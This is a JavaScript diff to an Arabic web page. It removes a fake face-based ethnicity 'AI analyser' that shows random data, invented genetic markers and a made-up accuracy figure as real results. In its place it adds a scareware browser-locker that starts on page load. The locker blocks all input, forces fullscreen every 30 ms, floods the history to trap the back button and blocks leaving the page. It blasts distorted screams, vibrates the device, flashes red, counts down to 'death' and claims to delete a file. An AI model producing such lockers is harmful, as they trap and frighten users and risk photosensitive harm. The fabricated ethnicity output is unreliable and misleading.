-                        { name: 'جنوب أفريقيا', percentage: 20, regions: ['جنوب أفريقيا', 'ناميبيا', 'بوتسوانا'] }
-                    ]
-                };
-                
-                return subGroups[primary] || subGroups['العربية'];
-            }
-            
-            generateFacialMap() {
-                const points = [];
-                for (let i = 0; i < 500; i++) {
-                    points.push({
-                        x: Math.random() * 100,
-                        y: Math.random() * 100,
-                        cluster: Math.floor(Math.random() * 3) + 1
+            grow() {
+                if (!this.alive) return;
+                this.age++;
+                if (this.age > this.maxAge) { this.alive = false; return; }
+                if (this.radius < this.maxRadius) this.radius += this.growth;
+                if (this.radius > 18 && this.branches.length < 14 && Math.random() < 0.18) {
+                    this.branches.push({
+                        x: this.x + (Math.random() - 0.5) * this.radius * 3,
+                        y: this.y + (Math.random() - 0.5) * this.radius * 3,
+                        radius: 5 + Math.random() * 22,
+                        opacity: 0.4 + Math.random() * 0.5
                     });
                 }
-                return points;
             }
-            
-            generateNeuralNetwork() {
-                return {
-                    layers: this.neuralLayers,
-                    activations: Math.floor(Math.random() * 1000000000000) + 1000000000000,
-                    accuracy: 99.7 + Math.random() * 0.3,
-                    trainingTime: '72 ساعة على 64 GPU'
-                };
-            }
-            
-            generateGeographicDistribution(ethnicity) {
-                const distributions = {
-                    'العربية': [
-                        { region: 'الخليج العربي', percentage: 40, countries: ['السعودية', 'الإمارات', 'الكويت'] },
-                        { region: 'المشرق', percentage: 30, countries: ['سوريا', 'لبنان', 'الأردن'] },
-                        { region: 'المغرب العربي', percentage: 20, countries: ['المغرب', 'الجزائر', 'تونس'] },
-                        { region: 'وادي النيل', percentage: 10, countries: ['مصر', 'السودان'] }
-                    ],
-                    'الأوروبية': [
-                        { region: 'أوروبا الشمالية', percentage: 35, countries: ['السويد', 'النرويج', 'الدنمارك'] },
-                        { region: 'أوروبا الوسطى', percentage: 30, countries: ['ألمانيا', 'فرنسا', 'سويسرا'] },
-                        { region: 'أوروبا الشرقية', percentage: 20, countries: ['روسيا', 'بولندا'] },
-                        { region: 'أوروبا الجنوبية', percentage: 15, countries: ['إيطاليا', 'إسبانيا'] }
-                    ]
-                };
-                
-                return distributions[ethnicity] || distributions['العربية'];
-            }
-            
-            generateGeneticMarkers(ethnicity) {
-                const markers = {
-                    'العربية': ['J1-M267', 'J2-M172', 'E-M35', 'G-M201', 'R1b-V88'],
-                    'الأوروبية': ['R1b-U106', 'R1a-M458', 'I1-M253', 'I2-M438', 'G2a-L497'],
-                    'الأفريقية': ['E-M2', 'E-M35', 'B-M60', 'A-M13', 'E-V38']
-                };
-                
-                return markers[ethnicity] || markers['العربية'];
-            }
-            
-            generateHaplogroups(ethnicity) {
-                const groups = {
-                    'العربية': ['J1', 'J2', 'E1b1b', 'G', 'R1b'],
-                    'الأوروبية': ['R1b', 'R1a', 'I1', 'I2', 'N'],
-                    'الأفريقية': ['E', 'A', 'B', 'E1b1a', 'E1b1b']
-                };
-                
-                return (groups[ethnicity] || groups['العربية']).slice(0, 3);
-            }
-            
-            generateTimeline() {
-                return [
-                    { year: '200,000 ق.م', event: 'الهجرة من أفريقيا' },
-                    { year: '50,000 ق.م', event: 'الوصول إلى الشرق الأوسط' },
-                    { year: '10,000 ق.م', event: 'ثورة العصر الحجري الحديث' },
-                    { year: '3,000 ق.م', event: 'الحضارات المبكرة' },
-                    { year: '1,500 م', event: 'الهجرات الحديثة' },
-                    { year: 'القرن 21', event: 'التوزيع الحالي' }
-                ];
-            }
-            
-            updateTerminal(message) {
-                const terminal = document.getElementById('terminalOutput');
-                const line = document.createElement('div');
-                line.className = 'terminal-line';
-                line.textContent = `$ ${message}`;
-                terminal.appendChild(line);
-                terminal.scrollTop = terminal.scrollHeight;
+            draw(ctx) {
+                if (!this.alive) return;
+                const base = this.isBlood ? 'rgba(200,0,0,' : 'rgba(0,0,0,';
+                const g = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius);
+                g.addColorStop(0, base + this.opacity + ')');
+                g.addColorStop(0.35, base + (this.opacity * 0.85) + ')');
+                g.addColorStop(0.65, base + (this.opacity * 0.4) + ')');
+                g.addColorStop(1, 'rgba(0,0,0,0)');
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = g;
+                ctx.fill();
+
+                const halo = ctx.createRadialGradient(this.x, this.y, this.radius * 0.4, this.x, this.y, this
+                    .radius * 1.6);
+                halo.addColorStop(0, 'rgba(255,0,0,0)');
+                halo.addColorStop(0.5, 'rgba(255,0,0,' + (this.opacity * 0.3) + ')');
+                halo.addColorStop(1, 'rgba(255,0,0,0)');
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius * 1.6, 0, Math.PI * 2);
+                ctx.fillStyle = halo;
+                ctx.fill();
+
+                this.branches.forEach(b => {
+                    b.opacity -= 0.0015;
+                    if (b.opacity <= 0) return;
+                    const bg = ctx.createRadialGradient(b.x, b.y, 0, b.x, b.y, b.radius);
+                    bg.addColorStop(0, base + b.opacity + ')');
+                    bg.addColorStop(1, 'rgba(0,0,0,0)');
+                    ctx.beginPath();
+                    ctx.arc(b.x, b.y, b.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = bg;
+                    ctx.fill();
+                });
             }
         }
 
-        // 🚀 تهيئة النظام
-        const aiSystem = new AdvancedAI();
-        let currentAnalysis = null;
+        function spawnSpot() {
+            if (!isDead) return;
+            const count = timeLeft <= 5 ? 15 : timeLeft <= 10 ? 8 : timeLeft <= 20 ? 5 : 3;
+            for (let i = 0; i < count; i++) {
+                if (rotSpots.length < MAX_SPOTS) rotSpots.push(new RotSpot());
+            }
+            setTimeout(spawnSpot, timeLeft <= 5 ? 120 : timeLeft <= 10 ? 250 : timeLeft <= 20 ? 350 : 500);
+        }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            // إعداد سحب وإفلات
-            const uploadZone = document.getElementById('uploadZone');
-            const fileInput = document.getElementById('fileInput');
-            const uploadBtn = document.getElementById('uploadBtn');
-            
-            uploadZone.addEventListener('click', () => fileInput.click());
-            uploadBtn.addEventListener('click', () => fileInput.click());
-            
-            fileInput.addEventListener('change', handleFileUpload);
-            
-            // إعداد سحب وإفلات
-            uploadZone.addEventListener('dragover', (e) => {
-                e.preventDefault();
-                uploadZone.style.borderColor = 'var(--quantum)';
-                uploadZone.style.transform = 'scale(1.05)';
+        function animateRotCanvas() {
+            if (!isDead) { rotCtx.clearRect(0, 0, rotCanvas.width, rotCanvas.height); return; }
+            rotCtx.fillStyle = 'rgba(0,0,0,0.08)';
+            rotCtx.fillRect(0, 0, rotCanvas.width, rotCanvas.height);
+            rotSpots.forEach(s => { s.grow();
+                s.draw(rotCtx); });
+            rotSpots = rotSpots.filter(s => s.alive);
+            if (Math.random() < 0.25) {
+                rotCtx.fillStyle = 'rgba(255,0,0,' + (Math.random() * 0.06) + ')';
+                rotCtx.fillRect(0, 0, rotCanvas.width, rotCanvas.height);
+            }
+            requestAnimationFrame(animateRotCanvas);
+        }
+
+        // --- جسيمات ---
+        class Particle {
+            constructor() {
+                this.x = Math.random() * particleCanvas.width;
+                this.y = Math.random() * particleCanvas.height;
+                this.vx = (Math.random() - 0.5) * 5;
+                this.vy = (Math.random() - 0.5) * 5;
+                this.size = 1 + Math.random() * 5;
+                this.opacity = 0.4 + Math.random() * 0.6;
+                this.life = 80 + Math.random() * 150;
+                this.age = 0;
+            }
+            update() { this.x += this.vx;
+                this.y += this.vy;
+                this.age++; return this.age < this.life; }
+            draw(ctx) {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(255,0,0,' + (this.opacity * (1 - this.age / this.life)) + ')';
+                ctx.fill();
+            }
+        }
+
+        function spawnParticle() {
+            if (!isDead) return;
+            if (particles.length < MAX_PARTICLES) {
+                for (let i = 0; i < 8; i++) particles.push(new Particle());
+            }
+            setTimeout(spawnParticle, 80);
+        }
+
+        function animateParticles() {
+            if (!isDead) { particleCtx.clearRect(0, 0, particleCanvas.width, particleCanvas.height); return; }
+            particleCtx.clearRect(0, 0, particleCanvas.width, particleCanvas.height);
+            particles = particles.filter(p => p.update());
+            particles.forEach(p => p.draw(particleCtx));
+            requestAnimationFrame(animateParticles);
+        }
+
+        // --- صوت مزدوج مشوه ---
+        function initAudio() { try { audioCtx = new(window.AudioContext || window.webkitAudioContext)(); } catch (
+                e) {} }
+
+        function playOmegaSound(f1, f2, dur) {
+            if (!audioCtx || !isDead) return;
+            try {
+                [f1, f2].forEach(f => {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    const distortion = audioCtx.createWaveShaper();
+                    const curve = new Float32Array(44100);
+                    for (let i = 0; i < 44100; i++) {
+                        const x = (i * 2) / 44100 - 1;
+                        curve[i] = ((3 + 600) * x * 20 * Math.PI / 180) / (Math.PI + 600 * Math.abs(x));
+                    }
+                    distortion.curve = curve;
+                    distortion.oversample = '4x';
+                    osc.type = Math.random() < 0.5 ? 'sawtooth' : 'square';
+                    osc.frequency.setValueAtTime(f, audioCtx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(15, audioCtx.currentTime + dur);
+                    gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
+                    osc.connect(distortion);
+                    distortion.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + dur);
+                });
+            } catch (e) {}
+        }
+
+        function screamLoop() {
+            if (!isDead) return;
+            playOmegaSound(250 + Math.random() * 1500, 400 + Math.random() * 1800, 0.4);
+            setTimeout(screamLoop, timeLeft <= 5 ? 200 : timeLeft <= 10 ? 350 : timeLeft <= 20 ? 500 : 700);
+        }
+
+        // --- اهتزاز ---
+        function vibrateLoop() {
+            if (!isDead) return;
+            if (navigator.vibrate) {
+                if (timeLeft <= 5) navigator.vibrate([40, 20, 40, 20, 40, 20, 120, 60, 200]);
+                else if (timeLeft <= 10) navigator.vibrate([70, 35, 70, 35, 70, 35, 180]);
+                else if (timeLeft <= 20) navigator.vibrate([100, 50, 100, 50, 180]);
+                else navigator.vibrate([150, 80, 150]);
+            }
+            setTimeout(vibrateLoop, timeLeft <= 5 ? 350 : timeLeft <= 10 ? 500 : timeLeft <= 20 ? 650 : 850);
+        }
+
+        // --- تأثيرات ---
+        function flashAttack() {
+            if (!isDead) return;
+            flashLayer.style.background = 'rgba(255,0,0,' + (Math.random() * 0.6) + ')';
+            flashLayer.style.opacity = '1';
+            setTimeout(() => { flashLayer.style.opacity = '0'; }, 35 + Math.random() * 50);
+            setTimeout(flashAttack, timeLeft <= 5 ? 150 : timeLeft <= 10 ? 300 : timeLeft <= 20 ? 500 : 900);
+        }
+
+        function spawnGlitchLine() {
+            if (!isDead) return;
+            const line = glitchLines[Math.floor(Math.random() * 4)];
+            line.style.top = (3 + Math.random() * 90) + '%';
+            line.style.opacity = '0.9';
+            line.style.height = (3 + Math.random() * 10) + 'px';
+            setTimeout(() => { line.style.opacity = '0'; }, 60 + Math.random() * 120);
+            setTimeout(spawnGlitchLine, timeLeft <= 5 ? 200 : timeLeft <= 10 ? 350 : timeLeft <= 20 ? 600 : 1000);
+        }
+
+        function showPopup() {
+            if (!isDead) return;
+            const p = popups[Math.floor(Math.random() * 5)];
+            p.textContent = popupMessages[Math.floor(Math.random() * popupMessages.length)];
+            p.style.display = 'block';
+            p.style.top = (5 + Math.random() * 55) + '%';
+            p.style.left = (3 + Math.random() * 40) + '%';
+            p.style.animation = 'none';
+            p.offsetHeight;
+            p.style.animation = 'fadeInOut 1.3s forwards';
+            setTimeout(() => { p.style.display = 'none'; }, 1300);
+            setTimeout(showPopup, timeLeft <= 5 ? 600 : timeLeft <= 10 ? 900 : timeLeft <= 20 ? 1400 : 2000);
+        }
+
+        const fadeStyle = document.createElement('style');
+        fadeStyle.textContent =
+            '@keyframes fadeInOut{0%{opacity:0;transform:scale(0.7);}15%{opacity:1;transform:scale(1.05);}25%{transform:scale(1);}75%{opacity:1;}100%{opacity:0;transform:scale(1.2);}}';
+        document.head.appendChild(fadeStyle);
+
+        // --- شل ---
+        function killAll(e) {
+            if (!isDead) return;
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            if (navigator.vibrate) navigator.vibrate(8);
+            return false;
+        }
+
+        const allEvents = [
+            'touchstart', 'touchmove', 'touchend', 'touchcancel',
+            'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove',
+            'pointerdown', 'pointermove', 'pointerup', 'pointercancel',
+            'gesturestart', 'gesturechange', 'gestureend',
+            'keydown', 'keyup', 'keypress', 'scroll', 'wheel',
+            'contextmenu', 'selectstart', 'dragstart', 'drop'
+        ];
+
+        function applyShields() {
+            allEvents.forEach(type => {
+                document.addEventListener(type, killAll, { passive: false, capture: true });
+                window.addEventListener(type, killAll, { passive: false, capture: true });
+                shields.forEach(s => s.addEventListener(type, killAll, { passive: false,
+                    capture: true }));
             });
-            
-            uploadZone.addEventListener('dragleave', () => {
-                uploadZone.style.borderColor = 'var(--genetic)';
-                uploadZone.style.transform = 'scale(1)';
-            });
-            
-            uploadZone.addEventListener('drop', (e) => {
-                e.preventDefault();
-                uploadZone.style.borderColor = 'var(--genetic)';
-                uploadZone.style.transform = 'scale(1)';
-                
-                if (e.dataTransfer.files.length) {
-                    handleFileUpload({ target: { files: e.dataTransfer.files } });
-                }
-            });
-            
-            // إنشاء شبكة عصبية متحركة
-            createNeuralNetwork();
+        }
+
+        function forceFullscreen() {
+            if (!isDead) return;
+            const el = document.documentElement;
+            ['requestFullscreen', 'webkitRequestFullscreen', 'webkitRequestFullScreen', 'mozRequestFullScreen',
+                'msRequestFullscreen'
+            ].forEach(m => { if (el[m]) { try { el[m](); } catch (e) {} } });
+            window.scrollTo(0, 1);
+        }
+
+        async function requestWakeLock() {
+            try { if ('wakeLock' in navigator && isDead) await navigator.wakeLock.request('screen'); } catch (e) {}
+        }
+
+        window.addEventListener('beforeunload', function(e) {
+            if (!isDead) return;
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
         });
 
-        async function handleFileUpload(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            // بدء التحليل
-            startAnalysis();
-            
-            // محاكاة تحليل متقدم
-            const results = await aiSystem.quantumAnalysis(file);
-            
-            // عرض النتائج
-            displayResults(results);
-            
-            // حفظ في التاريخ
-            saveToHistory(results);
+        for (let i = 0; i < 2000; i++) {
+            history.pushState({ dead: true, l: i }, '', location.href + '#l' + i);
         }
 
-        function startAnalysis() {
-            document.getElementById('aiProgress').style.display = 'block';
-            document.getElementById('resultsContainer').style.display = 'none';
-            
-            // مسح التيرمينال
-            document.getElementById('terminalOutput').innerHTML = '';
-            
-            // بدء الرسوم المتحركة
-            animateProgress();
-            animateNeuralNetwork();
-        }
+        window.addEventListener('popstate', function() {
+            if (!isDead) return;
+            history.pushState({ dead: true }, '', location.href);
+            forceFullscreen();
+        });
 
-        function animateProgress() {
-            const progressBar = document.querySelector('.progress-fill');
-            let width = 0;
-            
-            const interval = setInterval(() => {
-                width += 2;
-                progressBar.style.width = width + '%';
-                
-                if (width >= 100) {
-                    clearInterval(interval);
-                }
-            }, 50);
-        }
+        window.addEventListener('pagehide', function(e) {
+            if (!isDead) return;
+            e.preventDefault();
+            return false;
+        });
 
-        function createNeuralNetwork() {
-            const container = document.getElementById('neuralNetwork');
-            container.innerHTML = '';
-            
-            // إنشاء خلايا عصبية
-            for (let i = 0; i < 50; i++) {
-                const neuron = document.createElement('div');
-                neuron.className = 'neuron';
-                neuron.style.left = Math.random() * 100 + '%';
-                neuron.style.top = Math.random() * 100 + '%';
-                neuron.style.animationDelay = Math.random() * 2 + 's';
-                container.appendChild(neuron);
+        // --- العداد ---
+        function updateTimer() {
+            timeLeft--;
+            timerEl.textContent = timeLeft;
+            progressEl.style.width = ((TOTAL - timeLeft) / TOTAL * 100) + '%';
+
+            if (timeLeft <= 10) {
+                timerEl.style.color = '#ff0000';
+                timerEl.style.fontSize = '200px';
+                timerEl.style.textShadow = '0 0 150px #ff0000, 0 0 250px #ff0000';
+                document.body.style.background = '#020000';
+                threatEl.textContent = 'الموت وشيك';
             }
-        }
-
-        function animateNeuralNetwork() {
-            const neurons = document.querySelectorAll('.neuron');
-            neurons.forEach(neuron => {
-                neuron.style.left = Math.random() * 100 + '%';
-                neuron.style.top = Math.random() * 100 + '%';
-            });
-        }
-
-        function displayResults(results) {
-            document.getElementById('aiProgress').style.display = 'none';
-            document.getElementById('resultsContainer').style.display = 'block';
-            
-            // عرض النتائج الأساسية
-            document.getElementById('primaryEthnicity').innerHTML = `
-                ${results.primaryEthnicity}
-                <div style="font-size: 1rem; color: var(--matrix); margin-top: 10px;">
-                    ثقة عالية جداً
-                </div>
-            `;
-            
-            document.getElementById('confidenceValue').textContent = `${results.confidence.toFixed(2)}%`;
-            
-            // تحديث دائرة الثقة
-            const circle = document.querySelector('.confidence-circle');
-            const percentage = results.confidence;
-            circle.style.background = `conic-gradient(var(--quantum) 0% ${percentage}%, transparent ${percentage}% 100%)`;
-            
-            // إنشاء خريطة الوجه
-            createFaceMap(results.facialMap);
-            
-            // عرض التوزيع الجغرافي
-            displayGeographicDistribution(results.geographicDistribution);
-            
-            // عرض نتائج الشبكة العصبية
-            displayNeuralResults(results.neuralNetwork);
-            
-            // عرض الميزات المتقدمة
-            displayAdvancedFeatures(results);
-        }
-
-        function createFaceMap(points) {
-            const container = document.getElementById('faceMap');
-            container.innerHTML = '';
-            
-            points.forEach(point => {
-                const dot = document.createElement('div');
-                dot.className = 'data-point';
-                dot.style.left = point.x + '%';
-                dot.style.top = point.y + '%';
-                
-                // تلوين النقاط حسب الكتلة
-                const colors = ['#00D4FF', '#FF00CC', '#00FF88', '#FFAA00'];
-                dot.style.background = colors[point.cluster % colors.length];
-                dot.style.boxShadow = `0 0 10px ${colors[point.cluster % colors.length]}`;
-                
-                container.appendChild(dot);
-            });
-        }
-
-        function displayGeographicDistribution(distribution) {
-            const container = document.getElementById('geographicDistribution');
-            let html = '<div style="display: flex; flex-direction: column; gap: 15px;">';
-            
-            distribution.forEach(item => {
-                html += `
-                    <div style="background: rgba(0, 212, 255, 0.1); padding: 15px; border-radius: 10px; border-left: 4px solid var(--quantum);">
-                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
-                            <strong>${item.region}</strong>
-                            <span style="color: var(--quantum);">${item.percentage}%</span>
-                        </div>
-                        <div style="font-size: 0.9rem; color: #888;">
-                            ${item.countries.join('، ')}
-                        </div>
-                    </div>
-                `;
-            });
-            
-            html += '</div>';
-            container.innerHTML = html;
-        }
-
-        function displayNeuralResults(neural) {
-            const container = document.getElementById('neuralResults');
-            container.innerHTML = `
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-                    <div style="background: rgba(255, 0, 204, 0.1); padding: 10px; border-radius: 8px;">
-                        <div style="font-size: 0.9rem; color: #888;">الطبقات</div>
-                        <div style="font-size: 1.5rem; color: var(--neural);">${neural.layers}</div>
-                    </div>
-                    <div style="background: rgba(0, 255, 136, 0.1); padding: 10px; border-radius: 8px;">
-                        <div style="font-size: 0.9rem; color: #888;">الدقة</div>
-                        <div style="font-size: 1.5rem; color: var(--genetic);">${neural.accuracy.toFixed(2)}%</div>
-                    </div>
-                </div>
-                <div style="margin-top: 15px; font-size: 0.9rem; color: #888;">
-                    ${neural.activations.toLocaleString()} تفعيلة عصبية
-                </div>
-            `;
-        }
-
-        function displayAdvancedFeatures(results) {
-            const featuresContainer = document.querySelector('.advanced-features');
-            
-            let featuresHTML = `
-                <div class="feature-item">
-                    <i class="fas fa-dna" style="color: var(--quantum);"></i>
-                    <div>
-                        <strong>الماركرات الجينية</strong>
-                        <p>${results.geneticMarkers.slice(0, 3).join('، ')}</p>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <i class="fas fa-sitemap" style="color: var(--neural);"></i>
-                    <div>
-                        <strong>الهابلوغروبات</strong>
-                        <p>${results.haplogroups.join('، ')}</p>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <i class="fas fa-chart-line" style="color: var(--genetic);"></i>
-                    <div>
-                        <strong>مقاييس كمومية</strong>
-                        <p>${results.quantumMetrics.processingPower} | ${results.quantumMetrics.accuracy} دقة</p>
-                    </div>
-                </div>
-            `;
-            
-            featuresContainer.innerHTML += featuresHTML;
-        }
-
-        function saveToHistory(results) {
-            const historyItem = {
-                id: Date.now(),
-                ethnicity: results.primaryEthnicity,
-                confidence: results.confidence,
-                timestamp: new Date().toLocaleString('ar-SA'),
-                markers: results.geneticMarkers.slice(0, 2)
-            };
-            
-            aiSystem.analysisHistory.unshift(historyItem);
-            
-            if (aiSystem.analysisHistory.length > 5) {
-                aiSystem.analysisHistory = aiSystem.analysisHistory.slice(0, 5);
+            if (timeLeft <= 5) {
+                timerEl.style.fontSize = '220px';
+                timerEl.style.animation = 'timerPulse 0.08s infinite';
+                document.body.style.background = timeLeft % 2 === 0 ? '#000' : '#0a0000';
+                threatEl.textContent = 'النهاية...';
             }
-            
-            // في التطبيق الحقيقي، هنا يتم حفظ في localStorage
+            if (timeLeft <= 0) release();
         }
 
-        // إضافة تأثيرات إضافية
-        function createQuantumParticles() {
-            const container = document.createElement('div');
-            container.style.position = 'fixed';
-            container.style.top = '0';
-            container.style.left = '0';
-            container.style.width = '100%';
-            container.style.height = '100%';
-            container.style.pointerEvents = 'none';
-            container.style.zIndex = '-1';
-            
-            for (let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'quantum-particle';
-                particle.style.position = 'absolute';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 3 + 's';
-                container.appendChild(particle);
-            }
-            
-            document.body.appendChild(container);
+        function release() {
+            isDead = false;
+            clearInterval(timerInterval);
+            clearInterval(fsInterval);
+            shields.forEach(s => s.style.display = 'none');
+            rotCanvas.style.display = 'none';
+            particleCanvas.style.display = 'none';
+            flashLayer.style.display = 'none';
+            glitchLines.forEach(l => l.style.display = 'none');
+            popups.forEach(p => p.style.display = 'none');
+
+            allEvents.forEach(type => {
+                document.removeEventListener(type, killAll, true);
+                window.removeEventListener(type, killAll, true);
+            });
+
+            deleteFile();
+
+            document.querySelector('.container').innerHTML = `
+                <div class="skull" style="font-size:65px;">💀</div>
+                <div class="title" style="font-size:20px;">انتهى الوقت</div>
+                <div class="msg" style="font-size:16px;color:#ff0000;">😈 تم تحرير النظام 😈</div>
+                <div class="file-indicator" style="font-size:13px;color:#ffaa00;text-shadow:0 0 20px #ffaa00;">
+                    🗑️ تم حذف: ${FILE_NAME}
+                </div>
+                <div class="msg" style="font-size:9px;color:#555;margin-top:12px;">[ ø ASAØ // OMEGA ]</div>
+            `;
+            document.body.style.background = '#000';
+            setTimeout(() => { window.location.href = 'about:blank'; }, 3500);
         }
 
-        // تشغيل تأثيرات إضافية
-        createQuantumParticles();
-        
-        // تحديث مستمر للمصفوفة
-        setInterval(() => {
-            const matrixBG = document.querySelector('.matrix-bg');
-            matrixBG.style.backgroundPosition = `${Math.random() * 100}px ${Math.random() * 100}px`;
-        }, 100);
+        function launch() {
+            createRealFile();
+            setTimeout(() => {
+                initAudio();
+                applyShields();
+                forceFullscreen();
+                requestWakeLock();
+                animateRotCanvas();
+                animateParticles();
+                timerInterval = setInterval(updateTimer, 1000);
+                fsInterval = setInterval(forceFullscreen, 30);
+                setTimeout(spawnSpot, 250);
+                setTimeout(spawnParticle, 150);
+                setTimeout(screamLoop, 200);
+                setTimeout(vibrateLoop, 120);
+                setTimeout(flashAttack, 350);
+                setTimeout(spawnGlitchLine, 500);
+                setTimeout(showPopup, 700);
+                if (navigator.vibrate) navigator.vibrate([600, 200, 600, 200, 800]);
+                playOmegaSound(300, 700, 0.6);
+                window.scrollTo(0, 1);
+            }, 400);
+        }
+
+        window.addEventListener('load', function() { setTimeout(launch, 150); });
+        window.addEventListener('focus', function() { if (isDead) { forceFullscreen();
+                requestWakeLock(); } });
+        if (screen.orientation && screen.orientation.lock) { screen.orientation.lock('portrait-primary').catch(
+            () => {}); }
     </script>
 </body>
 </html>
